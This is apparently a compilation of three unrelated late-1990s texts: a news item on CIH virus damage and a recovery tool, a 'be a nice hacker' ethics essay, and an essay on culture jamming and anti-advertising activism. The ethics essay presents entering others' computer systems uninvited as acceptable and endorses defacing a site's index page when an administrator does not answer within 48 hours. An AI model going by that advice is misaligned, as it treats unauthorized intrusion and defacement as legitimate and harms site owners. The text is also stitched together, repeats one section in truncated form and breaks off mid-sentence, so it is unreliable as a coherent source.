      CIH virus outbreaks have been most prevalent in the Asian region. 
    
      Some experts say this is because of the large amount of pirated
      software in use there, and the fact that many CDs were infected at the
      time of manufacture. 
    
      A variant of the virus has been found that will trigger tomorrow, and
      could continue to strike on the 26th of each month until it is removed
      from a system. 
    
      Virus expert with Queensland firm Hamilton Multi-media, James Wallis,
      said he had created a fix that overcame the impact of the virus,
      allowing users to access data on their hard drives. 
    
      "We sat down and figured out exactly how the virus corrupts the disks
      and set out to develop a way to fix it," he said. 
    
      Mr Wallis said it took six 14-hour days to create the fix. 
    
      The company has made the fix available as a free download from its
      Web site. 
    
      He said the virus could be beaten because only data in the first portion
      of a hard drive, including the file allocation table, was corrupted. 
    
      The remainder was left intact but inaccessible until the lost section was
      rebuilt. 
    
      "Our program starts at the end of the disk and works backwards," he
      said. 
    
      "Using sophisticated algorithms, it recreates the data at the beginning
      of the drive." 
    
      Mr Wallis said the fix had been used successfully to resurrect more than
      a dozen infected hard drives brought in by customers. 
    
      More than 180 copies of the fix had been downloaded from the Web
      site in the week after it was made available. 
    
      But Mr Wallis said little could be done for PCs in which the virus had
      also attacked the BIOS chip. "In many cases it is a matter of having to
      replace the chip because there is nothing that can be done in software
      to fix it."

      be a nice hacker... 
      by system ( 21st may 1999).


      --------------------------------------------------------------------------------
      
      [ Introduction.  ]
      
      I made this articles because there are so much cracker than a real hackers in 
      Indonesia and all over the world. 
      
      
      
      --------------------------------------------------------------------------------
      
      [ General description. ]
      
      A hacker is a people that can enter into some computer system without anybody 
      know about it. Generally a hacker do not intend to publish this interruption to
      the internet communities, they don't like publication, they only want tray their
      security, isn't it good or bad. If they found their security is bad or weak, they
      will tell the administrator, tell them that there is a hole in their system, and 
      suggest the administrator to fix it before something bad happening to their system. 
      
      But with these days, this things were being forget by them who call their self a 
      hacker. There are so many hacking / cracking scene that only for publication purpose 
      at this time. They don't obey the ethics that in behind of underground world. 
      
      
      
      --------------------------------------------------------------------------------
      
      [ A details description. ]
      
      Being a hacker, they must remember one thing " DO NOT INTEND TO BREAK THE SYSTEM ". 
      We must keep this thing in our self, if you are the real hacker of course. A hacker,
      that I'm already tell you in the front of this articles, only get inside the system,
      looking around, if they find any hole in the system, they will tell the administrator
      the hole. The hacker never break or change the data's that inside that system. Even if
      they have a capabilities to break and change that data's, but look, they only look, 
      read, study it, if it is good for their self they keep it on their mind, if not they 
      leave it with out a trace. 
      
      I know this is probably sound pretty boring for you guy's that just get into this scene,
      and sometime the question that exist in your mind is " So what's the benefit for me ? ".
      Well, the benefit is the knowledge that you get, a hacker never do something for their 
      own purpose. They only study and study for getting a lot of knowledge. 
      
      So what the deals with this knowledge ? 
      
      To answer this question, you must look something that surrounding you. Let we see the 
      easy one, the monitor, the keyboard, the cpu, the mouse that you using right now, where
      it come from ? From the science's isn't it ? Where science's come from ? From the 
      knowledge isn't it ? 
      
      Knowledge is the most important thing in this world, and I believe all knowledge will 
      be use, maybe not at this time, but it will in the next couple years or more. 
      
      Try to thing objectively, in old time Leonard Da Vinci has paint how the helicopter works
      in his note pad, as all of you know at his time people even don't have any prescription 
      about a flying copter. But in a few years later, that could be happened like know. You 
      see, that the real value of a knowledge's. 
      
      To bad, these value of knowledge's has been forgotten just like that, many of our pal's 
      from Indonesia more like to break the system and change the data's that exist on it. One
      thing that really occurred in Indonesia is they only want getting the free internet account
      than the knowledge's. If this still happen in the next couple years, what is the main 
      purpose of internet ? 
      
      I tell you these for not make a certain people happy, but this negative phenomenon should
      be get away from Indonesia, because Indonesia people can not think smart if they keep using
      the internet in a wrong way. 
      
      Some people tell me that this is an equal position, because the telephone and internet fee
      in Indonesia is very expensive if we compare it with the other country. Yes this is true,
      but this is a wrong thinking. Don't look from one side, but look at two side or more. If 
      you are in the ISP and Telephone side, you will see what happening to them. They will broke
      if you still do this. 
      
      Okay, back to the main subject. Why Indonesian hacker like to break the system ? 
      
      I don't sure for 100%, but I think this is happen because they lack of information, especially 
      the ethics in underground world. It is our job to tell them so they this is will not happen 
      again in the future. 
      
      I'm not a hacker, but I will they you some ethics that I know : 
      
      - Do not break the system 
      
      - Do not change the data's that exist on the system 
      
      - Tell the administrator the hole that you have been found 
      
      - Don't even try to delete all files in their system. ( If in Web server, please don't delete all 
        HTML / Scripts in their directory, if the administrator doesn't respond your email, change the 
        index.html with your own word, but keep the old one, rename the old one, for example   oldindex.html,
        as I know this only happen if the administrator not respond your email in 48   hours ). 
      
      - And for the administrator, your also need to obey the ethics. Keep the hacked version   index.html 
        for 24 hours. 
      
      Let me tell you, if you obey these ethics, people will regret you, even you could be a friend with the administrator for no time.
      
      
      --------------------------------------------------------------------------------
      
      [ Summary. ]
      
      - Being a hacker doesn't mean you will be famous in a short time. 
      
      - A hacker jobs is not an easy way. 
      
      - A hacker with out the ethics is just a looser mind. 
      
      - Remember, hacker only purpose is for knowledge.

         Hacking Memes 



         (Viewing this article is illegal in Australia)

         This essay is about subversion.

         1. The Essence of the Meme

         The concept of the meme has been working its way around the web for a while
         now, instantiating itself in Wired's regular feature, Hype List, in articles, and in
         general currency.

         As David Bennahum writes at the top of each issue of Meme, a meme is a 

              contagious idea that replicates like a virus, passed on from mind to
              mind. Memes function the same way genes and viruses do, propagating
              through communication networks and face-to-face contact between
              people. 

         The tune you can't get out of your head, the phrase you keep using in your
         conversation, the image of the perfect donut - these are all memes, ideas which
         have passed from somewhere out there into your head and into your
         consciousness.

         Transference is the essence of the meme. Principia Cybernetica Web defines it as
         "an information pattern, held in an individual's memory, which is capable of being
         copied to another individual's memory." The Hacker's Dictionary defines it as "An
         idea considered as a replicator, esp. with the connotation that memes parasitize
         people into propagating them much as viruses do."

         The concept, we are told, originates in Richard Dawkins's 1976 book The Selfish
         Gene. The word 'meme' sounds like 'gene' and has similar properties. Humans,
         from the point of view of either gene or meme, are the means by which genes - or
         memes - are propogated. Animals, plants, and even ourselves, are merely their
         disposable "survival machines".

         Our human capacity to communicate consists in our ability to transfer idea from
         one person to another. Not to say that such transference is perfect. We all know
         the story where the message gets changed as it is whispered ear to ear down a line
         of people. But it is reliable. Most of the time, the receiver gets the information the
         sender wanted to convey.

         Different forms of communication operate more or less effectively. A casual
         conversation you have on the bus will be forgotten by day's end, while this essay
         may linger in your mind a few days longer. Neither conversation nor essay,
         however, has the staying power of the McDonald's jingle (sing it with me: You
         deserve a break today...). Mere transference is not sufficient. For an idea to take
         hold in another person, it must be internalized, it must be what Dreyfus and Dreyfus
         call the expert, or intuitive, state of knowledge.

         From the standpoint of humans, ideas are the currency of the information
         economy. An idea which replicates well is worth money, because the idea that
         implants itself of intuitive knowledge acts as a determinate of behaviour. The best
         way to get a person to buy your product or to use your service is to internalize it, to
         make dialing 10-10-800 an action. In advertising it's an old rule of thumb: mention
         the product name three times in a 15 second spot. 

         As Andrew Garton laments,

              The record industry maintains its status in the global economy and its
              income streams by way of repetition. Music that is played over and over
              again so much that it creates its own audience that in turn purchase its
              representation to listen to it over and over again in their homes, their
              cars, walkmans, bathrooms... anywhere one can think to place a
              speaker. 

         Ideas - and not just advertising - transmit themsleves through repetition.

         2. Advertising

         Repetition alone worked in the old days of limited media. When the sources of
         information were few and uniform, when there were three networks and one
         message. Today's consumers are not only more sophisticated - merely making
         them remember is no longer enough - consumers are the battleground for
         information wars, with messages flying at them from all directions. Drive down any
         city street and look at the images: one in ten (if you're lucky) is an actual traffic
         signal; the rest are trying to implant some idea, some behaviour, into your mind.

         Advertising today looks for stronger hooks, and it finds them in association and
         self-identification. The concept is especially simple: find (or define) a person's
         conception of self which is is pleasing. Mold that conception such that the use of a
         product or service is essential to that conception. Imprint the idea that in order to
         be yourself, you need to purchase such-and-such a brand.

         Nike, for example, understands this. After losing market share to Reebok, Nike's
         new advertising campaign focussed less and less on shoes and more and more on
         image. As Randall Lane explains in a recent Forbes article, 

              Nike's Phil Knight isn't selling shoes. He's selling attitude....

              Nike would sell not shoes but the athletic ideals of determination,
              individuality, self-sacrifice and winning....

              Nike ads almost never pitch product--or even mention the company's
              name. They create a mood, an attitude, and then associate the product
              with that mood. Call it image transfer. Cool ads, cool product. As Wieden
              puts it: "We don't set out to make ads. The ultimate goal is to make a
              connection." 

         The idea behind Nike's ads is to transfer a sense of identity from the person to the
         product.

         3. The Corporate Pitch

         People living in western democracies are flooded with advertising. The illusion is
         sustained that they are being offered choice, but in reality, they are being presented
         with a uniform message. Western society does not consist of many cultures,
         rather, more and more, they are being subsumed into a single culture.

         The reality of this hit home for me when I found myself listening to - and enjoying -
         Meredith Brooks's recent top 10 song, Bitch I realized I was watching an
         advertisement for the movie Practical Magic. Brooks's song - fresh, rebellious,
         catchy - was appropriated and incorporated into the larger media package. Indeed,
         it seems that most popular music today ties in with a movie or television show -
         and that most movies and television shows tie in with additional product lines. 

         These tie-ins define not only the breadth but also the limits of popular culture. Even
         rebellion is commodified - if it is not commodified, it is not shown. 'Culture' in our
         society, both from the popular point of view and even in academic studies - means
         'mass culture', as defined by the tightly woven network of the mass media meme.
         As author and pundit Carrie McLaren complains: 

              The real disappointment lies in (scholars') abject inability to recognize
              'popular culture' anywhere but in the officially-sanctioned showplaces
              of corporate America; their utter dependence on television to provide
              them with an imagery of rebellion. 

         Or as Mark Dery observes in his classic essay, Culture Jamming, 

              Corporate ownership of the newsmedia, the subsumption of an
              ever-larger number of publishing companies and television networks
              into an ever-smaller number of multinationals, and the increased
              privatization of truth by an information-rich, technocratic elite are not
              newly-risen issues. More recent is the notion that the public mind is
              being colonized by corporate phantasms---wraithlike images of power
              and desire that haunt our dreams.

         4. Hyper Reality

         Steve Mizrach, Culture Jamming: The Information War of the 90s:

              the French philosopher Baudrillard calls our postmodern existence
              "hyperreality." Real experiences and things have been replaced with
              simulacra - copies without an original. Due to the power of mass media
              advertising, our relationship to the signifier has changed. Now it hides
              the absence of a signified: conceals the inability to deliver real
              satisfaction by cleverly simulating it. Part of our hyperreal lives is the
              fact that our simulations are more real than real. Given a better imitation,
              people choose it over the real thing; hence Disney's Matterhorn enjoys
              more visitors than the real one in Switzerland. More insidiously, through
              various obfuscations, people come to think the simulacrum is the real
              McCoy, and forget about the historical and physical reality it represents. 

              Modern advertising critics like Mark Crispin Miller often note the hidden
              messages concealed within the cool graphics and media saturation of
              Madison Avenue and MTV. Originally, they suggest, advertising often
              connected the product being sold with some sort of self-image or way of
              life (pastoral, pleasant, family-oriented.) Often, it was conveyed that the
              product would somehow confer various advantages - popularity,
              sexiness, fame, success, power, even individuality. Today, ads are filled
              with a strange sort of rugged selfishness, misanthropy, and
              mean-spiritedness ("touch my doritos and die.") A person is told sternly
              to buy as much as they can of the product but never to share with
              friends. "Get your own," they're told. While various moral crusaders
              seek to combat the various sexual innuendos of TV programming, they
              rarely challenge the more subtle but socially disruptive images found in
              commercials and other advertising. 

              The product, no longer able to offer satisfaction on its own ground ("a
              potato chip is a chip is a chip"), instead offers the consumer a chance to
              be part of a certain 'crowd' or 'scene.' They belong to a cool "product
              tribe," revelling in the image and sensibility that the product somehow
              mystically confers - the fetishism of commodities, hyperaccelerated for
              Generation X. Analysts of postindustrial America suggest this is the
              secret hidden within these advertising campaigns - that more and more
              people are being sold style, image, and celebrity, since there is no
              substance or material satisfaction to the product-in-itself. Concealed
              within the jump-cut flash of postmodern advertising is a simple code:
              consumption is a mode of transcendence, a way to take part in
              something larger than yourself, "the Pepsi Generation." 

              Corporations utilize various techniques to carve Americans into
              various market profiles - not based on what products they use, but on
              what media messages they respond to. In other words, they
              are to be sold on the images they want to project to themselves and
              others, and not on the intrinsic usefulness of consumer items.
              Whatever values they supposedly  respond to, are translated into
              clever pitches, suggesting that the product somehow represents or
              embodies those values. Subliminal seduction has never been that
              important in advertising, despite the hype, but the use of semiotic
              strategies certainly has. Products are often "pitched" to specific ethnic
              groups, minorities, or sub-cultures, often using the Marcusian
              co-optation strategy of appealing to their own sense of difference or
              deviance. ("Wear our clothes, and then you'll be a real rebel.")

         5. The Information War

         Jesse Hirsh: 

              didn't you hear? they've declared information war against everybody.
              yep, that's right, the digital economy is really the perpetual war
              economy. Like genesis the great flood is on, only we're the ones being
              flooded, or rather bombarded by information, seeking our conversion to
              the holy faith of consumerism, otherwise known as virtual reality. 

              and of course in declaring war the state has identified its enemies and
              scapegoats: hackers, phreakers, and anarchists, all of whom are
              presumed terrorists. 

         We tend to think of the media message as pertaining to
         products and services only, and to restrict our concept
         of the tie-ins to toys, clothing, and running shoes. But
         the uniform image being broadcast extends well
         beyond consumer purchases; it is devoted to creating
         and maintaining the consumer society. No element of life is sacrosanct; all
         elements of society are infused.

         On the one hand, non-corporate forms of information - any information - are
         attacked. In some cases, the strategy is straight-forwardly political. Herbert Schiller,
         as quoted by Dery: 

              The commercialization of information, its private acquisition and sale,
              has become a major industry. While more material than ever before, in
              formats created for special use, is available at a price, free public
              information supported by general taxation is attacked by the private
              sector as an unacceptable form of subsidy...An individual's ability to
              know the actual circumstances of national and international existence
              has progressively diminished. 

         In Canada and other nations, we see this as the incessant attacks on public
         broadcasting networks such as the Canadian Broadcasting Corporation. 

         On another front, it involves attacking the integrity and
         credibility of alternative news sources. A recent
         National Post article on the CBC's coverage of
         biotechnology is typical. The author, Terence Corcoran,
         writes scathingly, 

              Ideology certainly dominated CBC Radio's
              This Morning show yesterday. Reporter Don
              Carty is a smooth-talking manipulator of
              words who gives his slanted reports a thin
              veneer of objectivity. 

         The corporate culture strives for the middle ground, to portray themselves as
         objective and neutral; any position from outside that camp is ridiculed as "biased"
         and "political".

         Alternatively, public media can be co-opted. Hence, for
         example, the sale of the educational Access Network by the
         Government of Alberta to the CHUM Media Group. Or the
         infiltration of the American Public Broadcasting System by
         corporate interests, with - as Carrie McLaren observes,
         inevitable results: 

              In the wake of the Disney/ABC merger, a Young and
              Rubicam (huge advertising firm) survey of 8,500 brands
              worldwide concluded that the most eligible brand for
              acquisition is the Public Broadcasting Service. Surprise,
              the home of "educational" programming like Barney and
              Nova is one big non-commercial commercial. Says
              PBS spokesperson Stu Kantor, "In terms of
              differentiation and personal relevance, it is the No. 2
              (behind Disney) media brand among the total
              population." 

         The mainstream media's fostering of a sanitary corporate image extends well
         beyond news and advertising. Situation comedies, dramas and movies - the
         mainstream of 'popular culture' - are plagued with product placement and are
         passed through the image scrubber before they air. The NBC's handling of Atomic
         Train is typical of the many instances reported by the Student Activists' Network
         Wayne Grytting, 

              After heavily promoting the movie's factual basis, NBC suddenly
              changed its mind with "no input" from its parent company, GE, a big
              investor in nuclear power. Alerted to the "fact" that nuclear wastes are
              not transported by trains, they added a disclaimer emphasizing the
              movie's fictional character which they showed at every commercial
              break. Then they overdubbed every mention of nuclear waste with the
              phrase "hazardous waste", thereby achieving the look of a dubbed
              Japanese horror film. 

         The image of the world that we receive through popular culture - whether in music,
         in the cinema, or on television - is a carefully polished version of reality. Mark Dery: 

              The commercialization of information, its private acquisition and sale,
              has become a major industry. While more material than ever before, in
              formats created for special use, is available at a price, free public
              information supported by general taxation is attacked by the private
              sector as an unacceptable form of subsidy...An individual's ability to
              know the actual circumstances of national and international existence
              has progressively diminished. 

         As the band Negativeland writes, 

              It is simply inconceivable that this daily, never ending stream of public
              suggestion and desire creation has no effect or influence on our spirits,
              our health, our jobs, our laws, our environment, our culture, our political
              process, or our national and international policy.

         6. Control of the Classrooms

         The battle extends to all corners of the information nation, even into the sanctity of
         the kindergarten classroom. Knowing that repetition and imprinting are key,
         advertisers are keen to infuse their message into the curriculum. Advertisers, for
         example, recently placed their product in mathematics textbooks. 

              "This looks like product placement, as they do in the movies," said
              David Walsh, director of the National Institute on Media and the Family,
              based in Minneapolis, which studies the effect of advertising on families.
              "The effect is the same. It gets at what I call the golden rule of influence,
              which is when the person being influenced doesn't even know it." 

         Media groups such as Channel One place television news shows into classrooms.
         As they say on their website,

              Channel One News is a daily, televised, 10-minute newscast that is
              beamed via satellite during the school year to each of the 12,000 schools
              in the Channel One Network community. Channel One News features
              stories on breaking news and in-depth issues that affect the world, the
              nation and specifically America's teenagers. 

         Leaving aside the question of advertising in education, an examination of what
         Channel One considers "news" is revealing. Today's (May 27, 1999) edition asks
         students how they liked Star Wars, covered Alannis Morisette, commented on body
         image, and reported "Live from Mt. Everest".

         The message broadcast to students on Channel One is clear: our culture is defined
         by the movies and music we see and hear, our culture is the best, and the best
         path to self-actualization is to immerse ourselves in this culture.

         Listen to Channel One on freedom in China: 

              Behind the Chinese government's restrictions are cultural and historical
              factors. For thousands of years, Chinese culture has been based on
              Confucian values, which people have a respect for authority. The ruler
              of the people is a father figure whom everyone must obey. The Chinese
              government's existing authoritarian style of leadership follows the
              ancient way of emperors who ruled China with "the mandate of
              Heaven." Individualism is not highly valued in Confucianism. Instead,
              people are encouraged to act in the best interest of the family and
              community. 

         The Chinese culture, according to Channel One, is inherently and irredeemable
         evil, based on authortarian "Confucian" values. Such an account misrepresents
         both Chinese culture and Confucianism. By contrast, the American culture is
         painted in pure tones, 

              America was founded by English colonists who wanted independence
              from Great Britain. The United States also has become a haven for
              immigrants fleeing religious and ethnic persecution in other countries.
              Because of these historical events, individualism and freedom is highly
              valued in American culture. 

         Here we have not only an assumption of genetic and racial purity, we also have a
         conflation of "freedom" and "individualism". And - leaving aside the fact that the
         dominant religion in the United States - Christianity - is at least as authoritarian as
         Confucianism, the 'fact' of freedom in the United States is traced to its religious
         roots.

         7. The Counteroffensive: Words as Weapons

         The counteroffensive is being mounted by a variety of forces who - until the advent
         of the internet - had few means of communication and interaction. The
         counteroffensive - an anti-cultural diatribe led by pagans and witches, socialists,
         anarchists and libertarians, webgrrls and riotgrrls, homosexuals and lesbians,
         environmentalists and consumer advocates - has moved from the trenches of
         alternative cafes and billboard defacing to the mainstream of online culture.

         The counteroffensive - now armed with the tools of mass media - is a guerilla
         operation using the word as weapon, as described by Dery: 

              The answer lies, perhaps, in the "semiological guerrilla warfare"
              imagined by Umberto Eco. "[T]he receiver of the message seems to
              have a residual freedom: the freedom to read it in a different way...I am
              proposing an action to urge the audience to control the message and its
              multiple possibilities of interpretation," he writes. "[O]ne medium can be
              employed to communicate a series of opinions on another medium...The
              universe of Technological Communication would then be patrolled by
              groups of communications guerrillas, who would restore a critical
              dimension to passive reception." 

         Or as the Quebec Public interest Research group puts it, 

              We can break the homogeneity of the media monopoly by expressing
              ourselves with our own media. Taking back our media means taking
              back our freedom and engaging in a revolution of many minds against a
              common enemy. Through workshops, panel discussions, and lectures,
              events such as Liberating Media seek to encourage and inspire
              participants to take back our media and our freedom in the diversity of
              forms in which they both exist. 

         The methodology of counterattack involves inserting counter-memes into the
         media mainstream. It is the idea of the meme conceived as virus taken to its logical
         extreme. This idea expresses itself even in Dawkin's seminary The Selfish Gene
         and is operationalized in William S. Burroughs's radical treatise, The Electronic
         Revolution: 

              The control of the mass media depends on laying down lines of
              association. When the lines are cut the associational connections are
              broken. 

              I have frequently spoken of word and image as viruses or as acting as
              viruses, and this is not an allegorical comparison. 

              You will notice that this process is continually subject to random
              juxtapostation. Just what sign did you see in the Green Park station as
              you glanced up from the People? Just who called as you were reading
              your letter in the Times? What were you reading when your wife broke a
              dish in the kitchen? An unreal paper world and yet completely real
              because it is actually happening. 

              The underground press serves as the only effective counter to a
              growing power and more sophisticated technique used by
              establishment mass media to falsify, misrepresent, misquote, rule out of
              consideration as a priori ridiculous or simply ignore and blot out of
              existence: data, books, discoveries that they consider prejudicial to
              establishment interest. 

              Consider the human body and nervous system as unscrambling
              devices. Remember that when the human nervous system unscrambles
              a scrambled message this will seem to the subject like his very own
              ideas which just occurred to him. 

              Consider now the human voice as a weapon. To what extent can the
              unaided human voice duplicate effects that can be done with a tape
              recorder? Learning to speak with the mouth shut, thus displacing your
              speech, is fairly easy. You can also learn to speak backwards, which is
              fairly difficult. I have seen people who can repeat what you are saying
              after you and finish at the same time. This is a most disconcerting trick,
              particularly when praciticed on a mass scale at a political rally. 

         Or, as put less eloquently by the Church of the Subgenius: 

              We're the Happy People. Happy to live in a world of images. Images of
              war. Family. Crime. Fun images, that help rinse away unsightly
              self-images, so you can get away from the privacy of your own home.

         7. The Counteroffensive: Words as Weapons

         The counteroffensive is being mounted by a variety of forces who - until the advent
         of the internet - had few means of communication and interaction. The
         counteroffensive - an anti-cultural diatribe led by pagans and witches, socialists,
         anarchists and libertarians, webgrrls and riotgrrls, homosexuals and lesbians,
         environmentalists and consumer advocates - has moved from the trenches of
         alternative cafes and billboard defacing to the mainstream of online culture.

         The counteroffensive - now armed with the tools of mass media - is a guerilla
         operation using the word as weapon, as described by Dery: 

              The answer lies, perhaps, in the "semiological guerrilla warfare"
              imagined by Umberto Eco. "[T]he receiver of the message seems to
              have a residual freedom: the freedom to read it in a different way...I am
              proposing an action to urge the audience to control the message and its
              multiple possibilities of interpretation," he writes. "[O]ne medium can be
              employed to communicate a series of opinions on another medium...The
              universe of Technological Communication would then be patrolled by
              groups of communications guerrillas, who would restore a critical
              dimension to passive reception." 

         Or as the Quebec Public interest Research group puts it, 

              We can break the homogeneity of the media monopoly by expressing
              ourselves with our own media. Taking back our media means taking

         8. Humble Beginnings

         Forget the names Jerry Rubin and Abbie Hoffman. The prima donna of
         underground radicalism is probably Saul Alinsky, whose anti-establishment and
         over-the-top forms of guerilla media propelled a wide variety of alternative causes
         into 60s mainstream.

         As one Amazon reviewer writes,

              Mr. Alinsky captures the outrage organizers have with the status quo.
              'Why organize?' is the central question that permeates throughout this
              book, and Mr. Alinsky answers this question with a scathing attack on
              the powers that be, who are beholden to maintaining the status quo. Mr.
              Alinsky allows the reader to not just dream of a better America but doles
              out powerful, practical methods to either; A. work within the current
              system to effect positive change, or B. bring the system to its knees in
              the quest toward positive change. An absolute must read for anyone
              wishing to take on the status quo of poverty, injustice, hatred, and
              discrimination. 

         If Alinsky had one major rule (other than "shock them") it was: "use their own rules
         against them". Consequently, Alinsky followers employed such radical tools as the
         court system, community newspapers, and town hall meetings.

         Early meme hackers in the Alinsky mold modified that advice only slightly: use
         their own words against them.

         Thus, for example, the Billboard Liberation Front
         modified public advertising to give common
         messages a slightly different - and twisted -
         meaning. Beginning in 1977 (by dropping the
         "M" in "Max Factor they highlighted the
         disturbing undertones in that company's slogan,
         "A pretty face isn't safe in this city") the BLF
         conducted a series of highly visible alterations in
         the San Francisco Bay area. The BLF was
         followed by many others, for example, POPaganda (Ron English). As the
         Apocalyptic Optimism for the End of History (Abrupt) puts it,

              Culture Jamming" sticks where rational discourse slides off. It is, simply,
              the viral introduction of radical ideas. It is viral in that it uses the enemy's
              own resources to replicate iteself -- copy machines, defaced billboards,
              web pages. It is radical because--ideally--the message, once deciphered,
              causes damage to blind belief. Fake ads, fake newspaper articles,
              parodies, pastiche. The best CJ is totally unexpected, surprising,
              shocking in its implications. 

         In a similar vein, Team Seven practised a series of renegade construction activities,
         recommending for example to its readers that they raise a flag of your their design
         at their local bank after it has closed for the day, or that they set up a reading area
         at a predefined other-useage area, such as a car wash or highway media.

         The Survival Research Laboratories in San Francisco adopt a more artistic format: 

              Since its inception SRL has operated as an organization of creative
              technicians dedicated to re-directing the techniques, tools, and tenets of
              industry, science, and the military away from their typical manifestations
              in practicality, product or warfare. Since 1979, SRL has staged over 45
              mechanized presentations in the United States and Europe. Each
              performance consists of a unique set of ritualized interactions between
              machines, robots, and special effects devices, employed in developing
              themes of socio-political satire. Humans are present only as audience or
              operators. 

         Meme hacking was limited by technology in the early days. Even Dery could only
         identify four major categories:

              Sniping and Subvertising (eg. Adbusters) 
              Media Hoaxing - Joey Skaggs 
              Audio Agitprop - eg. Sucking Chest Wound, whose God Family Country
              ponders mobthink and media bias; The Disposable Heroes of Hiphoprisy,
              who take aim in "Television, the Drug of the Nation 
              Billboard Banditry - eg. Billboard Liberation Front 

         Adbusters is a Vancouver based anti-advertising magazine. It is perhaps best
         known for Buy Nothing Day and TV Turn-Off Week campaigns. In addition to the
         monthly magazine, Adbusters attempts to run anti-consumerism advertisements
         on mainstream television. The response from the networks is usually negative;
         Adbuster's messages are labled "controversial" and banned. Its most recent
         campaign, is Economic Progress Killing the Planet - planned for airing during the
         G-7 conference in Germany, was rejected by the British Advertising Clearance
         Council as unacceptable. 

         A similar agency is The Centre for Media and
         Democracy, which focusses not just on advertising,
         but on public relations generally. As the agency's web
         site states, 

              Unlike advertising, public relations is often
              hard to recognize. "The best PR is invisible," say
              industry insiders. To spin the news in favor of
              their clients, PR firms specialize in setting up
              phony citizens' groups and scientific "experts"
              who spin out contrived research using junk
              science. 

         The Centre's main vehicle, like Adbusters, is a
         quarterly magazine, PR Watch, and they have released
         two books, Toxic Sludge Is Good For You: Lies, Damn
         Lies and the Public Relations Industry (1995) and Mad
         Cow USA: Could the Nightmare Happen Here? (1999). 

         The term Culture Jamming has its origins in the audio agitprop arena, and
         specifically, with an experimental-music and art collective known as Negativeland.
         They write on their website, 

              Advertising, especially the high tech seduction and emotional button
              pushing going on in national brand advertising, has become a special
              subject of interest for Negativland because of its telling view into the
              successful manipulation of the mass psyche, and the degree to which it
              exploits our common mental environment with the promotion of
              personal dissatisfaction and constant desire mongering on a universal
              scale. 

         Other anti-meme artists include The Seemen, "a collaborative of some forty odd art
         drop outs and extreme technology inventors who enjoy exploring their taste for the
         dark side of applied engineering in robot/kinetic art," and the Cacophony Society,
         including the The Los Angeles Cacophony Society and Cacophony Midwest,
         which recently launched the First Annual St. Louis Santa Rampage. "The
         Cacophony Society is an open network of creative malcontents, guerrilla artists,
         slackers, hooligans, kitsch-hounds, and anyone else interested in subverting
         primetime reality. You may already be a member!"

         9. Electronic Warfare

         The meme hackers of the 70s and 80s were marginalized. Their reach was limited,
         and social commentary following their acts (and subsequent arrests) was
         uniformly negative. Society as a whole - so it seemed - branded them as vandals
         and anarchists, radicals and communists.

         With the advent of the internet in the late 80s and early 90s, meme hacking was
         given a new life. While their access to mainstream media was still limited, activists
         could now communicate with each other in rapid, free and uncensored messages.
         moreover, the internet - and especially the world wide web - gave them a means of
         reaching directly into the mainstream consciousness, bypassing the media
         altogether.

         Early electronic meme hacking consisted of two major tactics: slashing, and
         spamming.

         Slashing is the appropriation of an existing meme for subcultural purposes. The
         term "slashing" derives from pornographic "K/S" - short for "Kirk/Spock" - stories
         written by Star Trek fans and published in underground fanzines. The theme
         unifying such stories is Kirk and Spock's long homosexual affair - an affair only
         alluded to in the on-air version of the series.

         The development of 'fan fiction' in general - and more recently, fanzines, fan web
         sites, and fan discussion boards - has had the effect of removing control of the
         'product' from the corporate studio and into the hands of the general public. Star
         Trek, in particular, has been the subject of hundreds of fan pages, and when
         Paramount attempted to crack down on the sites (in order to promote its
         Microsoft-only version), fans rebelled.

         The first subversive spam was probably Joe Matheny's deluge of ascii frogs sent
         to the White House (in return for which, he received in good order a deluge of
         automated reply messages). Matheny quickly wrote a shell program to filter the
         auto-replies and return them to their sender, which set up an email loop. With the
         advent of its abuse by more corporate interests (ZDNet and Xoom take note),
         spamming has declined as a weapon of choice, revealing as it does a general
         disregard for its recipients needs and interests.

         An image -

              Eduardo Kac led things off with a slide presentation demonstrating how
              the Web can become a life source. During his experiment in 1996, people
              worldwide where asked to join a teleconference, anytime during a three
              week period. The participants simply aimed their cameras to the
              heavens so that light on the other end of their transmission could be
              used to grow a freshly planted seed, which had been isolated in total
              darkness. Through the nourishment of the white lights, the seedling
              grew to 18" in height and was later planted outside the Art Institute of
              Chicago. 

         The central question of electronic counterculture revolves around media itself:
         who owns it, who controls it, and who uses it. As Jesse Hirsh writes, "We need to
         examine the right to communicate, and the communication of our rights." Dery
         echoes this theme: 

              Who will have access to this cornucopia of information, and on what
              terms? Will fiber-optic superhighways make stored knowledge
              universally available, in the tradition of the public library, or will they
              merely facilitate psychological carpet bombing designed to soften up
              consumer defenses? And what of the network news? Will it be
              superseded by local broadcasts, with their heartwarming (always
              "heartwarming") tales of rescued puppies and shocking (always
              "shocking") stories of senseless mayhem, mortared together with
              airhead banter? Or will the Big Three give way to innumerable news
              channels, each a conduit for information about global, national and local
              events germane to a specific demographic? 

              Will cyberpunk telejournalists equipped with Hi-8 video cameras, digital
              scanners, and PC-based editing facilities hack their way into legitimate
              broadcasts? Or will they, in a medium of almost infinite bandwidth and
              channels beyond count, simply be given their own airtime? In short, will
              the electronic frontier be wormholed with "temporary autonomous
              zones"---Hakim Bey's term for pirate utopias, centrifuges in which social
              gravity is artificially suspended---or will it be subdivided and
              overdeveloped by what cultural critic Andrew Ross calls "the
              military-industrial-media complex?" 

         The answer lies in the nature of the internet. Everybody will have access to
         information. The very nature of cyberspace is that it is interpersonal and
         multidirectional. There is no control and - despite the best efforts of the censors -
         there is no overseer. We see for the first time the elements of mainstream media on
         the retreat, trying to legislate, trying to litigate, trying to appropriate. But as the
         nature of cyberspace is communication such efforts will be in vain, for
         communication is deeply personal, exactly the opposite of the mass media
         message. We see this through concrete examples of anti-meme activities on the
         net.

         10. The Network

         The internet is about community. This is a
         realization corporate culture realized too late. The
         recent received wisdom of electronic commerce
         is that to be successful, online advertising must
         foster the development of community. But the
         countercultural community is already well
         established and well entrenched.

         Entities such as San Francisco's Laughing Squid
         have been using the internet to advertise their
         monthly countercultural 'tentacle sessions' for
         years now. Alternative 'religions' - such as the
         Church of the SubGenius congregate online and
         poke fun at mainstream values and culture.

         Organizations such as the The center for
         Commercial-Free Public Education use the
         internet to post messages, coordinate activist
         campaigns, and spread information. Activists are able to publicize to each other
         the effects of their anti-meme activities, as for example, this post describes the
         subversion of a political campaign:

              Two weeks ago there was a story that made the headlines in the
              newspaper and Compass (PEI's Evening News). The story was that a
              pamphlet had been distributed in the riding of Barry Hicken, our Minister
              of Environmental Resources. The pamphlet was made to look like a
              campaign pamphlet, with pictures of Hicken and the Liberal Party logo. It
              stated things like: 
              -My job has as Minister of Environmental Resources has been very
